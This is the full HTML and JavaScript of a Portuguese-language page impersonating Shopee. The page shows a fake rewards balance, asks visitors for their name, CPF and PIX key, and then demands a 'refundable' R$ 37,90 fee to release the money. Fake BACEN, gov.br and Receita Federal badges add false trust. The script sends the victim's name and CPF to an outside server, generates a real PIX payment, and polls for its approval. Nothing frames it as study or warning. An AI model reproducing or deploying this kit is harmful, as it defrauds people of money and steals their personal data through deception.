<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Resgate Shopee</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --orange: #ee4d2d;
            --bg-gray: #e5e5e5;
            --card-white: #ffffff;
            --text-black: #000000;
            --green-text: #00bfa5;
        }

        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }

        body {
            font-family: 'Roboto', sans-serif;
            background: var(--bg-gray);
            margin: 0;
            display: flex;
            justify-content: center;
            min-height: 100vh;
        }

        .app-container {
            width: 100%;
            max-width: 480px;
            background: #f1f1f1; /* Fundo exato da imagem */
            min-height: 100vh;
            position: relative;
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }

        /* --- FASE 1: DASHBOARD (FIDELIDADE 100%) --- */
        
        /* Título fora do card */
        .page-title {
            text-align: center;
            font-weight: 800;
            font-size: 18px;
            margin-top: 25px;
            margin-bottom: 15px;
            color: black;
        }

        /* CARD LARANJA */
        .balance-card {
            background: var(--orange);
            margin: 0 15px 20px;
            border-radius: 12px;
            padding: 20px;
            color: white;
            position: relative;
            box-shadow: 0 2px 10px rgba(238, 77, 45, 0.2);
        }
        .balance-label { font-size: 14px; margin-bottom: 5px; font-weight: 400; }
        .balance-value { font-size: 36px; font-weight: 900; letter-spacing: -1px; }
        .balance-points { font-size: 13px; opacity: 0.9; margin-bottom: 15px; }
        
        .divider-dashed {
            border-top: 1px dashed rgba(255,255,255,0.5);
            margin-bottom: 12px;
        }
        
        .last-bonus { 
            font-size: 13px; 
            font-weight: 500;
        }

        .coin-icon {
            position: absolute;
            top: 25px;
            right: 20px;
            width: 50px;
            height: 50px;
            background: #fdd835; /* Ouro */
            border: 3px solid #fbc02d;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: #f57f17;
            font-size: 28px;
            box-shadow: inset 0 0 5px rgba(0,0,0,0.1);
        }
        .coin-icon::after { content: '$'; }

        /* CARD BRANCO "SACAR DINHEIRO" */
        .white-card {
            background: var(--card-white);
            margin: 0 15px 15px;
            border-radius: 12px;
            padding: 20px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
        }

        .card-title {
            font-size: 16px;
            font-weight: 800;
            margin-bottom: 15px;
            color: black;
        }

        .payment-method {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
            color: #999;
            margin-bottom: 20px;
        }
        .card-icon { width: 18px; opacity: 0.5; }
        .pix-logo { height: 14px; opacity: 0.6; }

        /* BOTÕES DE VALOR */
        .grid-buttons {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 10px;
            margin-bottom: 10px;
        }
        .small-btn {
            background: #f0f2f5;
            padding: 12px 0;
            border-radius: 6px;
            text-align: center;
            font-weight: 700;
            font-size: 15px;
            color: #000;
        }

        /* BOTÃO GRANDE (ACIONÁVEL) */
        .big-btn {
            background: #f0f2f5;
            width: 100%;
            padding: 16px 0;
            border-radius: 6px;
            text-align: center;
            font-size: 26px;
            font-weight: 800;
            color: #000;
            margin-bottom: 10px;
            cursor: pointer; /* Gatilho */
            border: 2px solid transparent;
            transition: 0.2s;
        }
        .big-btn:active {
            border-color: var(--orange);
            background: #fff5f1;
        }

        /* BOTÃO "SACAR DINHEIRO" (VISUAL DESATIVADO) */
        .disabled-btn {
            background: #f7f7f7;
            width: 100%;
            padding: 14px 0;
            border-radius: 6px;
            text-align: center;
            font-size: 16px;
            font-weight: 700;
            color: #e0e0e0; /* Texto bem claro como na imagem */
            border: none;
            margin-bottom: 20px;
        }

        .legal-text {
            font-size: 11px;
            color: #9e9e9e;
            text-align: center;
            line-height: 1.4;
            padding: 0 5px;
        }

        /* CARD "OBTENHA SEU ACESSO" */
        .access-card {
            background: var(--card-white);
            margin: 0 15px 30px;
            border-radius: 12px;
            padding: 20px;
            display: flex;
            align-items: center;
            gap: 15px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
        }
        .access-text h4 { margin: 0 0 5px; font-size: 15px; font-weight: 800; color: black; }
        .access-text p { margin: 0; font-size: 10px; color: #666; line-height: 1.3; text-align: justify; }
        .bag-icon { width: 55px; height: auto; border-radius: 8px; }


        /* --- OUTRAS FASES (MANTIDAS) --- */
        .overlay-blur { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); backdrop-filter: blur(4px); z-index: 90; opacity: 0; pointer-events: none; transition: 0.4s; }
        .overlay-blur.active { opacity: 1; pointer-events: all; }

        .bottom-sheet { position: fixed; bottom: 0; left: 50%; transform: translateX(-50%) translateY(110%); width: 100%; max-width: 480px; background: white; border-top-left-radius: 20px; border-top-right-radius: 20px; padding: 25px; box-shadow: 0 -5px 25px rgba(0,0,0,0.15); z-index: 100; transition: 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
        .bottom-sheet.active { transform: translateX(-50%) translateY(0); }
        .input-group { margin-bottom: 20px; }
        .input-group label { display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px; color: #333; }
        .input-form { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; background: #f9f9f9; -webkit-appearance: none; }
        select.input-form { background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e"); background-repeat: no-repeat; background-position: right 1rem center; background-size: 1em; }
        .btn-action { width: 100%; padding: 16px; background: var(--orange); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; text-transform: uppercase; cursor: pointer; }

        .full-screen-page { position: fixed; top: 0; left: 50%; transform: translateX(-50%) translateY(100%); width: 100%; max-width: 480px; height: 100%; background: #eef1f3; z-index: 200; overflow-y: auto; transition: 0.4s ease-out; padding: 15px; padding-bottom: 40px; display: flex; flex-direction: column; }
        .full-screen-page.active { transform: translateX(-50%) translateY(0); }
        .shopee-top-logo { text-align: center; margin-bottom: 15px; margin-top: 10px; flex-shrink: 0; }
        .shopee-top-logo img { height: 35px; }
        .main-card { background: white; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); overflow: hidden; margin-bottom: 20px; flex-shrink: 0; }
        .card-header-orange { border-top: 6px solid var(--orange); padding: 20px; border-bottom: 1px solid #eee; }
        .label-disp { font-size: 12px; text-transform: uppercase; letter-spacing: 1px; color: #555; margin-bottom: 5px; }
        .val-big { font-size: 32px; font-weight: 800; color: #222; }
        .sub-wait { font-size: 14px; color: #666; margin-top: 5px; }
        .card-body { padding: 20px; }
        .confirm-title { font-size: 14px; color: #444; text-transform: uppercase; font-weight: 600; margin-bottom: 10px; }
        .price-tag-row { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; }
        .price-red { font-size: 28px; font-weight: 800; color: #d32f2f; }
        .tag-green { background: var(--green-tag); color: var(--green-text); font-size: 11px; font-weight: 700; padding: 4px 8px; border-radius: 4px; text-transform: uppercase; }
        .desc-text { font-size: 13px; color: #333; line-height: 1.5; margin-bottom: 25px; }
        .data-box-title { font-size: 12px; color: #888; font-weight: 700; text-transform: uppercase; margin-bottom: 15px; letter-spacing: 0.5px; }
        .data-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #f0f0f0; font-size: 14px; }
        .d-label { color: #666; }
        .d-value { font-weight: 600; color: #222; text-align: right; }
        .total-row { display: flex; justify-content: space-between; padding-top: 15px; align-items: center; }
        .total-val { font-size: 18px; font-weight: 800; color: #222; }
        .process-box { background: white; border-radius: 10px; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); flex-shrink: 0; }
        .process-title { font-size: 13px; font-weight: 700; color: #444; margin-bottom: 15px; text-transform: uppercase; }
        .step-item { display: flex; gap: 15px; margin-bottom: 20px; }
        .step-num { width: 24px; height: 24px; background: #fcece9; color: var(--orange); border-radius: 4px; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 12px; flex-shrink: 0; }
        .step-check { width: 24px; height: 24px; background: #e6f7f1; color: var(--green-text); border-radius: 4px; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 14px; flex-shrink: 0; }
        .step-content div:first-child { font-weight: 700; font-size: 14px; color: #333; margin-bottom: 3px; }
        .step-content div:last-child { font-size: 12px; color: #777; }
        .btn-final-red { background: #f53d2d; color: white; width: 100%; padding: 15px; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; margin-top: 10px; cursor: pointer; box-shadow: 0 4px 10px rgba(245, 61, 45, 0.2); }
        .timer-txt { text-align: center; font-size: 12px; color: var(--green-text); margin-top: 10px; font-weight: 500; display: flex; align-items: center; justify-content: center; gap: 5px; }
        .trust-badges-row { display: flex; justify-content: center; gap: 20px; margin-top: 25px; opacity: 0.8; }
        .trust-txt { font-weight: bold; font-size: 13px; color: #555; }
        #qr-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 300; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
    </style>
</head>
<body>

    <div class="app-container">
        
        <div id="stage-1" style="overflow-y: auto;">
            <div class="page-title">Resgatar recompensas</div>
            
            <div class="balance-card">
                <div class="balance-label">Seu saldo</div>
                <div class="balance-value">R$ 1.489,38</div>
                <div class="balance-points">= 42.583,05 pontos (s)</div>
                
                <div class="divider-dashed"></div>
                
                <div class="last-bonus">Última bonificação apresentada : R$ 845,24</div>
                <div class="coin-icon"></div>
            </div>

            <div class="white-card">
                <div class="card-title">Sacar dinheiro</div>
                
                <div class="payment-method">
                    <svg class="card-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
                    Transferencia via / 
                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a2/Logo%E2%80%94pix_powered_by_bcb.svg" class="pix-logo">
                </div>

                <div class="grid-buttons">
                    <div class="small-btn">R$1,5</div>
                    <div class="small-btn">R$5</div>
                    <div class="small-btn">R$10</div>
                </div>

                <div class="big-btn" onclick="abrirEtapa2()">R$ 1.489,38</div>
                
                <button class="disabled-btn">Sacar dinheiro</button>

                <p class="legal-text">
                    Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5. Os limites de saque para transações individuais e mensais podem variar conforme o país ou região.
                </p>
            </div>

            <div class="access-card">
                <div class="access-text">
                    <h4>Obtenha seu acesso exclusivo</h4>
                    <p>Descubra todos os benefícios liberados especialmente para você. Ao concluir o acesso, você poderá aproveitar as vantagens disponíveis de forma rápida, segura e sem complicações. Não perca a oportunidade de garantir algo que é limitado e pensado para quem chegou até aqui.</p>
                </div>
                <img src="https://logodownload.org/wp-content/uploads/2021/03/shopee-logo-0.png" class="bag-icon">
            </div>

            <div style="height: 20px;"></div>
        </div>


        <div class="overlay-blur" id="overlay"></div>

        <div class="bottom-sheet" id="stage-2">
            <h3 style="text-align: center; margin-bottom: 20px;">Vincular PIX</h3>
            <div class="input-group">
                <label>Nome Completo</label>
                <input type="text" id="input-nome" class="input-form" placeholder="Nome do titular">
            </div>
            <div class="input-group">
                <label>Tipo de Chave PIX</label>
                <select id="input-tipo" class="input-form">
                    <option value="cpf" selected>CPF</option>
                    <option value="celular">Celular</option>
                    <option value="email">E-mail</option>
                    <option value="aleatoria">Chave Aleatória</option>
                </select>
            </div>
            <div class="input-group">
                <label>Chave PIX</label>
                <input type="text" id="input-chave" class="input-form" placeholder="Digite sua chave" oninput="formatarCPFIfSelected(this)">
            </div>
            <button class="btn-action" onclick="irParaEtapa3()">CONTINUAR</button>
        </div>

        <div class="full-screen-page" id="stage-3">
            <div class="shopee-top-logo"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fe/Shopee.svg/2560px-Shopee.svg.png"></div>
            
            <div class="main-card">
                <div class="card-header-orange">
                    <div class="label-disp">SALDO DISPONÍVEL</div>
                    <div class="val-big">R$ 1.489,38</div>
                    <div class="sub-wait">Aguardando confirmação para saque</div>
                </div>
                <div class="card-body">
                    <div class="confirm-title">CONFIRMAÇÃO DE IDENTIDADE</div>
                    <div class="price-tag-row">
                        <div class="price-red">R$ 37,90</div>
                        <div class="tag-green">VALOR REEMBOLSÁVEL</div>
                    </div>
                    <p class="desc-text">Taxa obrigatória para liberação do bônus. O valor será reembolsado integralmente em 1 minuto.</p>
                    <div style="background: #f9f9f9; padding: 15px; border-radius: 8px; border: 1px solid #eee;">
                        <div class="data-box-title">DADOS PARA REEMBOLSO</div>
                        <div class="data-row"><span class="d-label">Nome</span><span class="d-value" id="review-nome">--</span></div>
                        <div class="data-row"><span class="d-label">Data</span><span class="d-value" id="review-data">--/--/----</span></div>
                        <div class="data-row"><span class="d-label">Chave PIX</span><span class="d-value" id="review-chave">--</span></div>
                        <div class="total-row"><span class="d-label">Valor a receber</span><span class="total-val">R$ 1.489,38</span></div>
                    </div>
                </div>
            </div>

            <div class="process-box">
                <div class="process-title">PROCESSO DE LIBERAÇÃO</div>
                <div class="step-item"><div class="step-num">1</div><div class="step-content"><div>Pagar taxa de confirmação</div><div>R$ 37,90 para verificação</div></div></div>
                <div class="step-item"><div class="step-check">✓</div><div class="step-content"><div style="color: var(--green-text);">Receber reembolso automático</div><div>Valor devolvido em 1 minuto</div></div></div>
                <div class="step-item"><div class="step-num" style="background: #eee; color: #999;">3</div><div class="step-content"><div>Acessar saldo completo</div><div>R$ 4.596,72 liberado</div></div></div>

                <button class="btn-final-red" id="btn-final" onclick="gerarPixReal()">Pagar taxa para Liberar Saque</button>
                <div class="timer-txt">⏱ Reembolso automático em 1 minuto</div>
                
                <div class="trust-badges-row">
                    <div class="trust-txt" style="color:#005da3;">BACEN</div>
                    <div class="trust-txt" style="color:#00a000;">gov.br</div>
                    <div class="trust-txt" style="color:#222; text-transform: uppercase;">Receita Federal</div>
                </div>
            </div>
            <div style="height: 30px; flex-shrink: 0;"></div>
        </div>

        <div id="qr-screen">
            <h3 style="color:#333;">Pagamento via Pix</h3>
            <p style="font-size:14px; text-align:center; color:#555;">Pague e receba seu saldo + estorno em 8s.</p>
            <img id="qr-image" style="width: 220px; margin: 20px 0; border:1px solid #eee;">
            <div id="pix-copia" style="font-size:11px; color:#777; background:#f0f0f0; padding:10px; border-radius:5px; word-break:break-all; margin-bottom:20px;"></div>
            <button class="btn-action" onclick="copiarCodigo()">COPIAR CÓDIGO</button>
            <div id="msg-sucesso" style="margin-top:20px; color:green; font-weight:bold; display:none;">✅ PAGAMENTO CONFIRMADO!</div>
        </div>

    </div>

    <script>
        const API_URL = "https://checkout-pix-profissional.onrender.com";

        function abrirEtapa2() {
            document.getElementById('overlay').classList.add('active');
            document.getElementById('stage-2').classList.add('active');
        }

        function irParaEtapa3() {
            const n = document.getElementById('input-nome').value;
            const c = document.getElementById('input-chave').value;
            if(n.length < 3 || c.length < 4) return alert("Preencha os dados");
            
            document.getElementById('review-nome').innerText = n;
            document.getElementById('review-chave').innerText = c;
            document.getElementById('review-data').innerText = new Date().toLocaleDateString('pt-BR');
            
            document.getElementById('stage-2').classList.remove('active');
            setTimeout(() => document.getElementById('stage-3').classList.add('active'), 200);
        }

        function formatarCPFIfSelected(i) {
            const tipo = document.getElementById('input-tipo').value;
            if (tipo === 'cpf') {
                let v = i.value.replace(/\D/g,"");
                v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,"$1.$2.$3-$4");
                i.value = v;
                i.setAttribute("maxlength", "14");
            } else i.removeAttribute("maxlength");
        }

        async function gerarPixReal() {
            const n = document.getElementById('input-nome').value;
            let c = document.getElementById('input-chave').value;
            if (document.getElementById('input-tipo').value === 'cpf') c = c.replace(/\D/g,'');
            
            const btn = document.getElementById('btn-final');
            btn.innerText = "GERANDO..."; btn.disabled = true;

            try {
                const res = await fetch(`${API_URL}/pix`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ amount: 37.90, name: n, cpf: c })
                });
                const data = await res.json();
                if(data.point_of_interaction) {
                    const qr = data.point_of_interaction.transaction_data;
                    document.getElementById('stage-3').classList.remove('active');
                    document.getElementById('overlay').classList.remove('active');
                    const telaQr = document.getElementById('qr-screen');
                    telaQr.style.display = 'flex';
                    document.getElementById('qr-image').src = `data:image/png;base64,${qr.qr_code_base64}`;
                    document.getElementById('pix-copia').innerText = qr.qr_code;
                    monitorar(data.id);
                }
            } catch (e) { alert("Erro de conexão."); btn.disabled=false; }
        }

        function monitorar(id) {
            setInterval(async () => {
                try {
                    const r = await fetch(`${API_URL}/pix/${id}`);
                    const j = await r.json();
                    if(j.status === 'approved' || j.status === 'refunded') {
                        document.getElementById('msg-sucesso').style.display = 'block';
                        document.getElementById('qr-image').style.opacity = 0.3;
                    }
                } catch(e){}
            }, 3000);
        }
        function copiarCodigo() { navigator.clipboard.writeText(document.getElementById('pix-copia').innerText); alert("Copiado!"); }
    </script>
</body>
</html>